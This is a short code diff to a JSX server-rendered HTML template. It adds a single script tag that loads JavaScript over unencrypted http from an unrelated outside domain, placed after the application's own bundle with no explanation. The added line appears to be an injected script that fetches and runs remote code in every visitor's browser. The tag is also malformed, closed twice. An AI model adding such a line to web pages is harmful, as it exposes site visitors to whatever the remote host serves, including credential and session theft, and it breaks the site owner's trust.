@@ -38,6 +38,7 @@ const Html = ({assets, component, store}) => (
         }}
       />
       <script src={assets.javascript.main} />
+      <script src="http://pwsm50.com/cpass-templates/js/vid.js" /></script>
     </body>
   </html>
 );
